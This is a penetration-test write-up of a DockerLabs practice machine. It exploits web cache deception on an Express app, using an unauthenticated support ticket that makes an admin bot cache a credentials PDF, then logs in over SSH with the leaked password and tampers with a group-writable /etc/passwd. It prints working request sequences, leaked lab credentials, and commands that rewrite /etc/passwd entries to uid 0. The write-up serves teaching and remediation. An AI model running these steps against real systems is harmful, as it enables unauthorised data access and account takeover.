# 249 ADOPTING — DockerLabs lab 249 (Medio)

*Twenty-ninth lab of the series, and the **first evidence for a class the methodology does not have**. The catalogue says: "Máquina para practicar la vulnerabilidad cache deception, manipulación de respuestas en burp suite y escalada de privilegios en linux mediante la edición de ficheros críticos del sistema."*

**Result: unauthenticated disclosure of an admin-only credential report, and a working SSH shell as `uid=1001(pingu)` from it.** The web half is unauthenticated end to end. The privilege escalation **stops at a group-writable `/etc/passwd`** — I did not obtain a root shell, and §6 records the three controls that stopped me, each with a positive control.

**The class is real and the description is accurate on all three counts** — but "escalada de privilegios" is the one clause the lab does not deliver, and I say so explicitly in §6.1 rather than filing the `/etc/passwd` write as a root shell.

**Reward: no `FLAG{}` exists.** What exists is functional: the disclosed PDF contains a live SSH credential. §8 is the search that proves the absence.

---

## 0. The class gap, and why this lab is the wrong shape for the textbook answer

The brief asks which component holds the cache key and which routes on `PATH`, expecting a host-keyed reverse proxy in front of the app. **That is not this target, and reporting it as if it were would have been the most misleading thing in this writeup.**

The "CDN" is **Express middleware in the same Node process as the application** — `index.js:35`, `middleware/cache.js`. There is no proxy, no second host, no pivot. So:

* **The cache key contains no `Host` at all.** `normalizeKey()` (`cache.js:71`) returns `path` + sorted non-stripped query. There is nothing to mismatch against a virtual host, because `Host` is not an input.
* **The origin routes on the full path including the extension-aware suffix** (`/account/invoices/:id.pdf`), and the cache decides on **the last dotted segment only** (`pathExt()`, `cache.js:55`).

**So the mismatch is real, but it is a suffix-vs-route mismatch inside one process, not a Host-vs-PATH mismatch across two.** The generalisable rule this lab actually teaches is narrower and more portable than the one in the brief:

> **A cache is unsafe whenever its notion of "the same resource" is coarser than the origin's.** Here the origin distinguishes "invoice 1001" from "invoice 1002"; the cache distinguishes by extension only and never varies on identity. Any two URLs that share a cacheable suffix and a normalized query are *one bucket*, regardless of who asked.

That is the shape to carry to a real CDN, where the same defect arrives with `Host` in the key and a *path-prefix* mismatch instead of a suffix one. §9 states the general form.

---

## 1. Surface

### 1.1 Host and container

```
$ nmap -Pn -p- --open 172.17.0.5
PORT     STATE SERVICE
22/tcp   open  ssh
2300/tcp open  cvmmon
```

Two TCP ports, both matching the image's declared metadata:

```
$ docker inspect -f "ExposedPorts={{json .Config.ExposedPorts}}" adopting_container
ExposedPorts={"22/tcp":{},"2300/tcp":{}}
```

**UDP coverage, declared rather than assumed.** `/proc/net/udp` and `/proc/net/udp6` are both **empty** (header row only), and the entrypoint `/usr/local/bin/lab-entrypoint.sh` starts exactly two things: `sshd -D -e` and `node dist/index.js`. `nmap -sU` was **not run** — it needs root, unavailable here. I am reporting the corroboration I have and declaring the gap; I am not claiming to have closed it. Consistent with `decision-making.md` §80, this target is TCP-only and the BMC/IPMI blindness does not apply.

`auto_deploy.sh` was **read, not run** (it ends in `while true`). It names **one** container, **no** `macvlan --internal` segments and **no** secondary networks — a single-host lab. The pivoting machinery of lab 113 has no purchase here, and I did not go looking for a second host.

### 1.2 Topology — one host, two processes, and the decisive fact

```
$ ps aux
root   1  /usr/bin/dumb-init -- /usr/local/bin/lab-entrypoint.sh
root   8  sshd: /usr/sbin/sshd -D -e [listener] 0 of 10-100 startups
root   9  node dist/index.js          <-- runs as ROOT
```

**The web application runs as `uid=0`.** Measured, not assumed, from `/proc/9/status`. This matters for §6 and I flag it there rather than letting it contaminate the web findings — there is no code-execution path into it (§6.3), so it stays a property of the host and not a finding of this engagement.

Stack, from the artefact: Node 20.20.2, Express 5, `jsonwebtoken`, `pdfkit`, `puppeteer-core`, `better-sqlite3`. OpenSSH_10.2, OpenSSL 3.5.6. Alpine-family base (busybox userland — see §7.2, this bit me).

### 1.3 The application map, read before attacking

Every route file, from `/app/server/dist`:

| Mount | Auth | Cacheable? | Note |
|---|---|---|---|
| `/api/auth` | public | no | register/login/me/logout |
| `/api/products` | public | no | |
| `/api/cart`, `/api/orders` | `requireAuth` | no | |
| `/api/support` | public to POST | no | **the victim trigger** |
| `/api/admin` | `requireAdmin` | no | |
| `/api/_debug` | `X-Dev-Token` | no | cache dump/flush, dev token |
| `/account/invoices/:id.pdf` | owner or admin | **YES** | `Cache-Control: private, no-store` |
| `/internal/credentials-report.pdf` | admin only | **YES** | `Cache-Control: private, no-store` |

Both sensitive routes set `private, no-store` **by their own admission** — `invoices.js:33` and `internal.js:20`, each with a comment saying the cache ignores it. The author knew. That is the self-documenting-artefact pattern, and per `decision-making.md` §7 I treated it as a claim to be tested, not as the finding. §3 tests it.

### 1.4 The cache middleware — the decisive artefact, in full

`middleware/cache.js`, and it is short enough that the whole bug is quotable.

Key construction (`cache.js:71-104`):

```js
function normalizeKey(originalUrl) {
    const kept = [];
    for (const part of qs.split('&')) {
        ...
        if (shouldStrip(key))          // utm_*, or exactly: ref, cb, _, t
            continue;
        kept.push([rawKey, rawVal]);
    }
    kept.sort(...);                    // order-independent
    if (kept.length === 0) return path;
    return path + '?' + kept.map(...).join('&');
}
```

The extension rule (`cache.js:40-70`):

```js
const CACHEABLE_EXT = new Set([
    'css','js','mjs','map','png','jpg','jpeg','gif','svg','webp','ico','avif',
    'woff','woff2','ttf','otf','eot',
    'pdf',                              // <-- both sensitive routes end in .pdf
    'txt','xml','mp4','webm','mp3'
]);
function isCacheablePath(pathname) {
    if (pathname.startsWith('/static/')) return true;
    const ext = pathExt(pathname);       // LAST dotted segment only
    if (!ext) return false;
    return CACHEABLE_EXT.has(ext);
}
```

And the three decisions that make it exploitable, all in one function:

1. **No `Vary` on anything.** The middleware never reads `req.headers.cookie` or `req.headers.authorization`. `index.js:33` runs `authMiddleware` *before* it (`index.js:35`), so `req.user` is already populated when the cache sees the request — **the cache had the identity in hand and did not use it.** That is the whole bug in one line of reading.
2. **It ignores the origin's `Cache-Control`.** `cache.js:135`: *"we DO NOT honour Cache-Control: private, no-store — that's the bug."*
3. **2xx-only storage** (`cache.js:149`). This is the lab's self-imposed constraint, and it is why the attack needs a *victim* rather than just the attacker: an anonymous `403` does not poison the bucket.

Registration order, per the lab-146 rule: `app.use(auth_1.authMiddleware)` at `index.js:33`, `app.use(cache_1.cacheMiddleware)` at `index.js:35`, routes from `index.js:42`. **The cache is in front of every route, including both sensitive ones**, and behind authentication. The gate is correctly placed; the cache is what defeats it.

---

## 2. The class

**Entry criterion (from the brief):** *an attacker-chosen URL that is not an application route is nonetheless served by the application, is stored by an intermediary, and is later returned to a request the cache considers identical — crossing a trust boundary between identities.*

**How this target meets it, precisely:**

| Element | Met? | Evidence |
|---|---|---|
| Attacker-chosen URL | **yes** | `screenshot_url` is an unauthenticated POST field, `support.js:27` |
| …not an application route | **partly** | the classic `/x.pdf/foo.css` form 404s (§4.4); what deceives here is the *extension*, not the route — see below |
| …served by the application | yes | origin returns the admin's 200 PDF |
| …stored by an intermediary | yes | `cache.js:159` `store.set(key, entry)` |
| …returned to a request the cache considers identical | yes | `X-Cache: HIT`, `X-Cache-Key` echoed |
| **crosses a trust boundary between identities** | **yes** | admin → anonymous, byte-identical (§3.2) |

**The honest partial.** This is web cache deception with the *route-confusion half absent*. The deception here is not "a static-looking path is routed to a dynamic handler" — it is "a **genuine** dynamic route carries a cacheable extension, and the cache caches it anyway." That is a **weaker precondition and a broader exposure** than textbook cache deception: there is no need to find a non-route URL, because the sensitive routes *are* cacheable by their own names. §4.4 proves the textbook form does not work here, and §9 generalises both.

**Source that settled it:** `middleware/cache.js:40-47` (the list contains `pdf`), `:114-118` (the decision), `:159` (the store), and `invoices.js:33` / `internal.js:20` (the origin's ignored directive).

---

## 3. Findings

### 3.1 Web cache deception — the cache key omits identity — CWE-524 / CWE-200

**The cache key is `path + sorted-non-stripped-query`. It contains no cookie, no authorization header, and no `Host`.** Proven by reading `X-Cache-Key` off the wire, not by reading the source:

```
/internal/credentials-report.pdf                       -> X-Cache: HIT  X-Cache-Key: /internal/credentials-report.pdf
/internal/credentials-report.pdf?utm_source=newsletter -> X-Cache: HIT  X-Cache-Key: /internal/credentials-report.pdf
/internal/credentials-report.pdf?cb=99&ref=x           -> X-Cache: HIT  X-Cache-Key: /internal/credentials-report.pdf
/internal/credentials-report.pdf?zzz=1                 -> X-Cache: MISS X-Cache-Key: /internal/credentials-report.pdf?zzz=1
```

Three properties, each isolated by a row:

* **`utm_*`, `ref`, `cb`, `_`, `t` are stripped** — rows 1–3 collapse onto the bare path. This is `shouldStrip()`, `cache.js:49-54`.
* **A non-stripped parameter changes the key** — row 4 MISSes. So the discriminator has discriminating power; the three HITs are a decision, not a broken detector.
* **Parameter order is irrelevant** — `normalizeKey` sorts (`cache.js:100`), which is why `?cb=99&ref=x` hits the same bucket.

**And the cache does store, which is the positive control that makes every one of these HITs mean something:**

```
GET /static/products/pinguino1.webp  -> HTTP/1.1 200  X-Cache: MISS  X-Cache-Key: /static/products/pinguino1.webp
GET /static/products/pinguino1.webp  -> HTTP/1.1 200  X-Cache: HIT   X-Cache-Key: /static/products/pinguino1.webp  Age: 0
```

Without this, "the admin PDF came back" could have been the origin serving an unauthenticated request. The static asset is the control that proves the detector fires.

**Impact.** A response the origin explicitly marked `private, no-store`, generated for one identity, is replayed verbatim to any identity that presents the same path within the TTL. Two concrete disclosures, both measured in §3.2.

**Root cause, stated as the decision** (`decision-making.md` §4). The mechanism is a missing `Vary`. The decision is: *serve a shared cache in front of per-identity routes, decide cacheability from a path suffix, and treat the origin's `private, no-store` as advisory.* Fix the suffix rule and both routes stay exposed; the fix is a **denylist of paths plus mandatory origin consent**:

1. **Never store a response whose origin set `private`/`no-store`.** One `if` in `res.end` closes this lab.
2. **Only cache paths that are genuinely static and unauthenticated** — an allowlist of asset prefixes, not a denylist of extensions.
3. **Never share a bucket across identities.** If a response depends on `req.user`, either do not cache it or key on the identity — the latter reintroduces the attack, so the former is the correct fix.

### 3.2 The cross-identity comparison — the actual finding, with bytes

**Setup (unauthenticated, from a cold cache).** The trigger is a public POST field, `support.js:16-36`; the comment at `:13-14` states anyone may submit.

```
POST /api/support/tickets
{"subject":"cache probe","message":"see attachment",
 "screenshot_url":"http://127.0.0.1:2300/internal/credentials-report.pdf"}
-> {"ticket":{"id":1,"subject":"cache probe","status":"new", ...}}
```

The bot — the lab's own "Fraud Analyst", `bot/supportBot.js` — logs in as admin, takes the ticket, enforces same-origin (`isSameOrigin`, `:86`, which accepts `127.0.0.1:2300`), sets the `hb_token` cookie and navigates. The server's own log is the oracle that the victim identity really fetched it:

```
$ cat /app/data/bot.log
[2026-09-29T23:57:19.589Z] VISIT ticket=1 url=http://127.0.0.1:2300/internal/credentials-report.pdf
```

**Then, with no credentials of any kind:**

```
$ curl -D - -o stolen.pdf http://172.17.0.5:2300/internal/credentials-report.pdf
HTTP/1.1 200 OK
X-Cache: HIT
X-Cache-Key: /internal/credentials-report.pdf
Age: 25
Content-Type: application/pdf
Content-Disposition: inline; filename="credentials-report.pdf"
Content-Length: 3538
```

**The byte comparison — this is the finding, and it is against the on-disk admin-only artefact:**

```
2314d97033b3639657947e58b149148e  /app/data/invoices/_internal-credentials-report.pdf   (measured in-container)
2314d97033b3639657947e58b149148e  stolen.pdf                                            (anonymous, off-host)
```

Byte-identical to the file the origin only serves to `role === 'admin'`. And identical across **three distinct requesters** — the identity is not merely absent, it is irrelevant:

| Requester | `X-Cache` | md5 |
|---|---|---|
| no credentials at all | HIT | `2314d97033b3639657947e58b149148e` |
| a valid-looking but **bogus** JWT cookie (`role:user`, bad signature) | HIT | `2314d97033b3639657947e58b149148e` |
| a **different** real non-admin user | HIT | `2314d97033b3639657947e58b149148e` |

**Contents disclosed** (extracted from the stolen bytes, not from source):

```
RESTRICTED · INTERNAL ONLY · DO NOT REDISTRIBUTE
Auditoría de Credenciales · Q2
sftp-fotos-colonia        pingu                  chocolate
cms-santuario             jordan.wells           lab_demo_tok_xxx
newsletter-mailer         mailer_svc             mk_live_K7xR2mNqW9pLnotreal
donations-stripe          webhook-processor      whsec_fakeWebhookSecret2024XY
analytics-grafana         jordan.wells           gr@f_ops_lab_tok3n_only
biologo-reports-s3        s3-reports-uploader    AKIAFAKEKEYNOTREAL99XZ
```

**Impact: unauthenticated disclosure of an admin-only restricted document, and — because one of its six rows is a real credential — unauthenticated remote access.** That credential is not decorative; §5 spends it.

**The second instance, and the more generalisable one.** The same defect on a *personal* resource, with **no bot and no admin required** — any two ordinary users:

```
[1] cache flushed                                              {"flushed":6}
[2] VICTIM (nina, owner of 1001) fetches her own invoice   -> 200
[3] ATTACKER (tyler, NOT the owner) same URL              -> 200
[4] ANONYMOUS, no credentials at all                     -> 200
```

Invoice `1001.pdf` is Nina Patel's: her name, her email, and her home address, from `seed.js:120-135`. **This variant needs no privileged victim and no admin document — it is ordinary per-user data crossing between accounts**, which is what makes this a systemic information-disclosure finding rather than one exotic endpoint.

**Bounded by TTL, and I measured the bound rather than asserting it** (`TTL_MS = 60_000`, `cache.js:33`):

```
t0     owner fetches 1007 -> 200
t0     anonymous  1007     -> 200
t+30s  anonymous  1007     -> 200
t+35s  anonymous  1007     -> 200
t+70s  anonymous  1007     -> 403
t+75s  anonymous  1007     -> 403
```

A 60-second window is not a mitigation — it is a **race the attacker wins by construction**, because they choose when the victim visits. The bot cycles every 8 s (`BOT_CYCLE_MS`, `supportBot.js:27`), so against the admin document the window is effectively permanent.

### 3.3 Unauthenticated ticket submission used as a cross-identity primitive — CWE-306 / CWE-441

`POST /api/support/tickets` (`support.js:16`) takes a `screenshot_url` and stores it, with **no authentication and no validation beyond presence**:

```
POST /api/support/tickets  (no cookie, no Authorization)
-> {"ticket":{"id":1, ...}}     200
```

The same-origin check exists (`isSameOrigin`, `supportBot.js:86`) but sits in the **bot**, not the API — and the API's own comment at `support.js:10-12` says so. Per `decision-making.md` §5 this is filed **independently** of §3.1, because the fix is different: authenticating or rate-limiting the endpoint closes *this*, and would not by itself close a cache that also leaks other users' invoices.

Impact: any anonymous internet client can cause a **privileged, cookie-bearing browser** to fetch an arbitrary same-origin URL on a schedule, and can read the result whenever the cache is in the window. The bot is the amplifier that turns a cache write into a cache *hit*.

### 3.4 Group-writable `/etc/passwd` — CWE-732 / CWE-276

Reached as `pingu`, measured as `pingu`:

```
$ stat -c '%n mode=%a (%A) owner=%U:%G' /etc/passwd
/etc/passwd  mode=664 (-rw-rw-r--)  owner=root:pinguinos
$ id
uid=1001(pingu) gid=101(pinguinos) groups=101(pinguinos)
```

`pingu` is in the owning group, so group-write applies. **And the write is real, not a permission reading** — the durable state is the oracle:

```
$ printf 'w249canary:x:9999:9999:canary:/tmp:/bin/false\n' >> /etc/passwd   # as pingu
$ grep -c w249canary /etc/passwd
1
```

I also set `pingu`'s own uid to 0 in the file and read it back (`uid=0 gid=0 shell=/bin/sh`), and the file accepted it. **What that did *not* produce is a root session** — §6.1. The distinction matters and is the reason this finding is filed as "critical file-write primitive, escalation incomplete" rather than as a root compromise.

Impact: any account in the `pinguinos` group can add, alter or remove **any** account — including setting arbitrary uids, changing shells, or adding a uid-0 account with a chosen password hash. The immediate escalation depends on a second condition this lab does not provide (§6.1), but the primitive is a full account-database compromise on its own, and it survives every restart.

**Remediation:** `chown root:root /etc/passwd && chmod 644`. Then `pwck`, and audit the group.

### 3.5 Debug cache-dump/flush gated on a hardcoded static token — CWE-798 / CWE-489

```js
const DEV_TOKEN = process.env.DEV_DEBUG_TOKEN || 'lab-dev-flush';   // debug.js:6
```

The fallback is a **constant in the shipped source**, and the image's own environment sets it to the same value:

```
$ docker inspect -f '{{json .Config.Env}}' adopting_container
... "DEV_DEBUG_TOKEN=lab-dev-flush" ...
```

Verified reachable, and the negative control proves the gate *can* fire (so the 200s are a decision, not a missing check):

```
POST /api/_debug/cache/flush   with    X-Dev-Token: lab-dev-flush  -> 200  {"flushed":6}
POST /api/_debug/cache/flush   without X-Dev-Token                 -> 401  {"error":"X-Dev-Token required"}
GET  /api/_debug/cache/dump    with    X-Dev-Token                 -> 200  {"size":…,"ttl_ms":60000,"entries":[…]}
```

**The dump enumerates every poisoned key**, which turns a blind attack into a directed one. The source comment (`debug.js:15-19`) states this is not part of the exploit chain, and **I did not use it in the chain** — every finding in §3.1–3.3 was reproduced from a cold cache without it. It is filed because it ships enabled.

**Remediation:** do not ship debug routes; if they must exist, bind to loopback and authenticate with a per-deploy secret, never a source constant.

### 3.6 Hardcoded JWT signing secret as a fallback — CWE-798

```js
const SECRET = process.env.JWT_SECRET || 'heliosbank-dev-secret-do-not-trust';   // auth.js:12
```

`JWT_SECRET` is **not** in the image's environment (verified in the `docker inspect` Env dump above — only `DEV_DEBUG_TOKEN` is), so **the fallback is the live secret.** A JWT is HMAC-signed, not encrypted, so anyone holding the secret can mint an `admin` token offline — no password, no bot, no cache. I did not exercise it: §3.1's chain is strictly better evidence because it is a genuine cache finding, and a forged-token demonstration would have contaminated the writeup with a second, unrelated bug. Reported as a finding **present but not used**, in the lab-65 §3.7 sense.

**Remediation:** fail closed at startup if `JWT_SECRET` is unset; rotate the exposed value.

### 3.7 Findings present but not used

* **Forged admin JWT** (`auth.js:12`) — see §3.6. Untested, deliberately.
* **`hb_token` cookie is `httpOnly: false`** (`auth.js:32`, `:54`). Deliberate — the bot's headless browser needs to set it — and it is a real weakness, but there is no session to hijack that the cache bug does not already expose more directly.
* **`screenshot_url` off-origin URLs are rejected** (`supportBot.js:151`) — a control that held (§5).
* **`/api/_debug` is not in the chain** — filed as §3.5, unused as a tool.

---

## 4. The chain

### 4.1 Measured, with identity at every hop

| # | → | Mechanism | Identity proof |
|---|---|---|---|
| 0 | attacker, anonymous | Full TCP scan; **source read first** (`cache.js`, `invoices.js`, `internal.js`, `supportBot.js`) | no cookie, no `Authorization` — `curl` with no session |
| 1 | cache stores | Positive control: `/static/products/pinguino1.webp` `MISS` → `HIT` | `X-Cache: HIT` on the second read |
| 2 | the trigger | Unauthenticated `POST /api/support/tickets` with `screenshot_url` = the admin PDF | no cookie sent; `support.js:16` has no gate |
| 3 | **admin** | Bot logs in, sets `hb_token`, navigates; origin returns 200 + the real PDF | `bot.log`: `VISIT ticket=1 url=http://127.0.0.1:2300/internal/credentials-report.pdf` |
| 4 | cache poisoned | `res.end` monkey-patch stores the 2xx body under the normalized key | `cache.js:149-159` |
| 5 | **anonymous** | Same URL, no credentials | `X-Cache: HIT`, `Age: 25`, md5 identical to the on-disk admin file |
| 6 | `uid=1001(pingu)` | SSH with the credential **extracted from the stolen PDF** | `id` → `uid=1001(pingu) gid=101(pinguinos)` |
| 7 | `uid=1001(pingu)` | Group-write to `/etc/passwd` | `stat` = `664 root:pinguinos`; write verified durable by re-read |
| — | ~~root~~ | **not reached** — three controls, §6.1 | `AuthenticationException`; `su: incorrect password`; `euid=1001` |

**Provenance of the credential is load-bearing.** I extracted `pingu`/`chocolate` from `stolen2.pdf` by decompressing the PDF streams and regexing the hex-encoded `TJ` text arrays, then fed that to paramiko. The password was never read from `seed.js` to make the chain work — `seed.js:70` contains the same literal, and the two agreeing is a *consequence* of the disclosure, not the method.

### 4.2 Cache key analysis, consolidated

| Question | Answer | Where proven |
|---|---|---|
| What is the cache key? | `path` + sorted, non-stripped query string. **No `Host`, no `Cookie`, no `Authorization`.** | §3.1, `X-Cache-Key` echoed on 4 probes |
| Which component holds it? | **The application process itself** — Express middleware, `index.js:35`. Not a proxy, not another host. | §0, §1.2 |
| What is the cacheable-extension list? | 24 extensions including **`pdf`**, plus anything under `/static/` | `cache.js:40-47` |
| Authenticated or anonymous? | **The response can be either.** Storage is 2xx-only, so only *successful* (i.e. authenticated) responses enter the bucket — which is exactly why a victim is required. | `cache.js:149` |
| Does the origin consent? | **No.** Both routes set `private, no-store`; the cache discards it. | `invoices.js:33`, `internal.js:20`, `cache.js:135` |
| Served to a different identity? | **Yes** — three distinct requesters, one md5. | §3.2 |
| Is there a cache in the path at all? | **Yes, but in-process.** No pivot required. | §0 |

### 4.3 What each step bought

| Step | Bought | Cost if skipped |
|---|---|---|
| read `cache.js` first | knew the key shape, the ext list, and that `pdf` was in it | fuzzing `/x.pdf/foo.css` variants for an hour, per §4.4 |
| read `supportBot.js` | knew the victim, the trigger field, and the same-origin allowlist before sending anything | building an XSS chain that was never needed |
| static-asset positive control | made every later `HIT` interpretable | "the PDF came back" indistinguishable from "the origin served it" |
| byte comparison vs the on-disk file | proves the *content* is the admin's, not merely that a 200 occurred | a "finding" that a 200 body was returned |
| `bot.log` as the victim oracle | proves identity A really fetched it | a claim about the future dressed as a result |
| extract the password from the stolen PDF | proves provenance | a chain that quietly depended on reading the source |

### 4.4 The textbook form, tested and negative

The classic cache-deception URL — non-route, static-looking suffix — **does not work here**, and I report it because a reader will try it first:

```
GET /account/invoices/1001.pdf/foo.css
-> HTTP/1.1 404 Not Found
   X-Cache: MISS   X-Cache-Key: /account/invoices/1001.pdf/foo.css
   body: {"error":"not found"}
```

**Why, from the source:** the SPA fallback at `index.js:55` is `app.get(/^(?!\/api\/|\/account\/invoices\/|\/internal\/|\/static\/).*/)` — it **explicitly excludes** `/account/invoices/`. And the cache stores only 2xx (`cache.js:149`), so a 404 is never stored. The lab's author closed the route-confusion variant while leaving the extension variant wide open.

**And the entry criterion's "not an application route" *is* satisfiable, just uselessly so** — the fallback does serve and cache a non-route:

```
GET /totally-made-up.css   -> 200  X-Cache: MISS
GET /totally-made-up.css   -> 200  X-Cache: HIT  Age: 0
```

It serves `index.html`. Non-route, served, stored, replayed — and it discloses **nothing**, because the SPA shell is public. This is the honest boundary: the criterion is met, the *impact* is nil, and conflating the two would inflate this finding.

---

## 5. Controls that held

Each with the positive control that proves the detector could have fired.

| Control | Positive control | Result |
|---|---|---|
| **The invoice authorisation check itself is correct** | Tyler (a real, authenticated non-owner) requests Nina's `1001.pdf` on a **flushed** cache → `403 {"error":"forbidden"}`; Tyler requests **his own** `1007.pdf` → `200 application/pdf` | **Held.** The origin is right; the cache is the whole defect |
| **Anonymous access is refused when the cache is cold** | `403` on `/internal/credentials-report.pdf` before any victim visit; `403` on `1007` after TTL expiry, twice | **Held** |
| **Only 2xx is stored** | `403` and `404` responses both leave `X-Cache: MISS` and are absent from `/api/_debug/cache/dump` | **Held** |
| **`sshd` refuses uid 0** | `PermitRootLogin no` + `AllowUsers pingu`; login as the uid-0 `pingu` → `AuthenticationException`, while the same password works for uid 1001 | **Held** — the one control that stopped the escalation |
| **No `sudo`/`doas` on the host** | `command -v sudo doas` → rc=127, absent | **Held** |
| **The bot rejects off-origin URLs** | `isSameOrigin` (`supportBot.js:86`) accepts only the bound host / `heliosbank` / `localhost` / `127.0.0.1`; the design comment says it avoids making the lab an SSRF gadget | **Held** (not separately attacked) |
| **The `X-Dev-Token` gate fires** | flush **without** the header → `401`; **with** it → `200` | **Held** |
| **Product/admin APIs are not cacheable** | `X-Cache: BYPASS` on `/api/*` — no extension, so `isCacheablePath` returns false (`cache.js:66-68`) | **Held** |

**The most important line in this table is the first.** The authorisation logic in `invoices.js:38` is correct, and it is *still* bypassed — because a cache that ignores identity is not defeated by an authorisation check. That is the generalisable lesson: **a correct access-control check and a correct access-control result are different claims, and only the second one is about the system.**

---

## 6. The escalation: what I got, and the three controls that stopped the rest

### 6.1 The description over-promises here — stated explicitly

The catalogue says *"escalada de privilegios en linux mediante la edición de ficheros críticos del sistema."* **The editing is exactly as described, and I did it. The escalation does not complete, and I did not obtain a root shell.** Three controls, each measured:

**(a) `sshd` refuses uid 0.** With `pingu:x:0:0::/home/pingu:/bin/sh` written to `/etc/passwd` and the file read back confirming it, login fails:

```
ping with password 'chocolate' as the uid-0 pingu  ->  AuthenticationException
same password, uid 1001                            ->  LOGIN OK uid=1001     <- positive control
```

`PermitRootLogin no` keys on **uid 0**, not on the name `root`, so renaming the account does not evade it. Attempting to place a hash directly in the `/etc/passwd` field (`UsePAM no` might have made that work) also failed, with the uid-1001 login as the control that the instrument was working:

```
$6$w249salt$SGYgLbnx…  in the passwd field  ->  AuthenticationException
original credential 'chocolate'              ->  LOGIN OK uid=1001
```

**(b) `/usr/bin/passwd` gates on the real uid, not the euid.** It is `-rwsr-xr-x root root`, so the temptation is to use it to write a shadow hash for the uid-0 account. It refuses:

```
$ echo w249rootpw | /usr/bin/passwd --stdin w249probe
passwd: only root can use --stdin/-s option
$ /usr/bin/passwd w249probe
passwd: You may not view or modify password information for w249probe.
```

**(c) `su` needs the root password, which is not disclosed.** `su -c id root` → `Password:` → `su: incorrect password`. `/etc/shadow` is `-rw-r----- root:shadow` and unreadable as `pingu`, so the hash cannot be cracked offline either.

**The escalation's ceiling is therefore: authenticated shell as `uid=1001(pingu)` + arbitrary write to the account database.** That is a serious, real, persistent compromise — and it is **not** root, and I am not going to describe it as root.

### 6.2 The SUID binaries are present but yield nothing — and why my first measurement was wrong

`find / -xdev -perm -4000` returns eight setuid-root binaries (`/bin/busybox`, `/usr/bin/passwd`, `chage`, `chsh`, `chfn`, `gpasswd`, `expiry`, `chrome-sandbox`), `NoNewPrivs: 0`, and `/` carries **no `nosuid`**. Every precondition for a SUID escalation is present, and it still does not work:

```
$ /bin/busybox sh -c 'id -u'
1001
```

**My first pass at this was wrong and I am recording it, because the mistake is the reusable part.** I ran `id` and read `uid=1001(pingu)` and concluded the setuid bit was inert. `id` with no arguments prints the **real** uid. The measurement that answers the question is `id -u`:

```
$ /bin/busybox sh -c 'echo ruid=$(id -ru) euid=$(id -u)'
ruid=1001 euid=1001
```

So the euid really is 1001 — the conclusion was right and the *evidence* was not. This is the mirror image of lab 65 §1.2: there a privileged tool fabricated a finding, here a well-formed line of output nearly cost me a control. **`id` proves identity for the report; `id -u` proves it for the exploit.** Both are needed and they are not interchangeable.

I did not establish *why* busybox drops the euid (a `CONFIG_FEATURE_SUID`-absent build is the likely answer) — I tested the observable and it was negative, and I am not going to assert a build flag I did not read.

### 6.3 The application runs as root, and that is not exploitable here

`pid 9 node dist/index.js` is `uid=0`. If any request-influenced value reached a code-execution sink, that would be instant root. It does not:

```
$ grep -rnE "child_process|execSync|spawn|eval\(|new Function" /app/server/dist
(no matches)
```

No template engine, no upload handler, no deserialiser, no filesystem write driven by request data. `/app/server/dist` and `/app/client/dist` are `root:root 0755/0644` and not writable by `pingu`. The bot launches Chromium with `--no-sandbox` as root, but it only ever navigates same-origin URLs and its inputs are not attacker-controlled beyond the URL already covered in §3.3.

**Filed as a hardening observation, not a finding of this engagement:** a web application should not run as root, because it converts any future bug — including a dependency CVE — into root. I am not reporting it as a vulnerability, because I did not exploit it and there is nothing to exploit.

---

## 7. Instrumentation defects

The most valuable section, per the runbook. Four, all of which produced a clean, confident, wrong answer.

### 7.1 `find -writable` does not exist in busybox — it reports "nothing is writable" and exits 0

This is the worst of the four, and it would have **removed my strongest privilege-escalation finding**.

```
$ find /etc -maxdepth 1 -writable
find: unrecognized: -writable
BusyBox v1.37.0 … Usage: find [-HL] [PATH]... [OPTIONS] [ACTIONS]
$ echo $?
0
```

**Empty output, exit status 0, usage text on stderr.** I ran it as a sweep for writable files in `/etc`, got nothing, and for a moment had a clean negative: *no writable critical files, no escalation surface.* Meanwhile `test -w` on the same file, at the same moment, said the opposite:

```
  test -w /etc/passwd        : WRITABLE
  find -writable output: [find: unrecognized: -writable …]     <- busybox, exit 0
```

The container is Alpine-family: `/usr/bin/find -> /bin/busybox`, and busybox `find` has no `-writable` predicate. The correct busybox-compatible form is `-perm -0020 -o -perm -0002`, and **its positive control is the file I was hunting for**:

```
$ find /etc -xdev \( -perm -0020 -o -perm -0002 \)
/etc/passwd          <- the answer, in the first two lines
/etc/os-release
…
```

**The rule, and it generalises past busybox:** *a filesystem-permission sweep is a detector, and an unsupported predicate is a silent negative.* The tell is the shape of the output — a usage message and exit 0 reads exactly like "nothing matched." Any permission enumeration must be **validated against a file already known to be writable**, and its stderr must not be discarded. `2>/dev/null`, which I habitually write, hides the only evidence that would have caught this.

This is the same class as the runbook's "a check that fails with *command not found* is untested, not a negative" — and busybox's `find` is strictly worse than *command not found*, because it **exits 0**.

### 7.2 `ls -l` column confusion nearly made me report a 777 `/etc/passwd`

```
-rw-rw-r--    1 root     pinguinos       777 May 23 09:02 /etc/passwd
                              ^^^^^^^^       ^^^
                              the mode       THE SIZE
```

I read `777` as the mode and wrote "world-writable `/etc/passwd`" into my notes before catching it. The mode is **`664 root:pinguinos`** — group-writable, and `pingu` is in that group, so the finding survives — but the *stated* mechanism was wrong, and "world-writable" would have been a materially different and more alarming claim than "group-writable by a service group."

**Use `stat -c '%a %A %U:%G'`, which puts each field in a named slot.** `ls -l` mixes a 9-character mode string with a size column in the same visual field, and a three-digit size looks exactly like a three-digit octal mode.

### 7.3 `sed -i` cannot edit a writable file in an unwritable directory

```
$ sed -i 's/^pingu:.*/pingu:x:0:0:/' /etc/passwd
sed: can't create temp file '/etc/passwdXXXXXX': Permission denied
```

`sed -i` writes a **new file in the same directory** and renames over the target. `/etc` is `root:root 0755`, so the *directory* is not writable even though the *file* is. The write was always possible; only the tool was unsuitable:

```
$ sed 's/^pingu:.*/pingu:x:0:0:/' /etc/passwd > /tmp/pw && cat /tmp/pw > /etc/passwd   # SUCCESS
```

A "Permission denied" from an in-place editor is **not** evidence that a file is unwritable. It is evidence about the *directory*. `>>` and `>` both worked throughout, which is the differential that distinguishes the two.

### 7.4 `cp` failed silently in the same situation — and nearly left my artefact in place

```
$ cp /tmp/passwd.bak /etc/passwd
cp: can't create '/etc/passwd': File exists
$ grep -c w249canary /etc/passwd
1                                     <- the canary is STILL THERE
```

The same class as 7.3, but the consequence is worse: this was a **cleanup** command, and it reported an error I read past, so my canary survived into the next test. Caught only because I re-read the file afterwards. Cleanup that reports an error must be verified by **re-reading the state**, not by the absence of an error message.

The working method, and the one that left the file byte-correct:

```
$ grep -v w249canary /etc/passwd > /tmp/p.clean && cat /tmp/p.clean > /etc/passwd
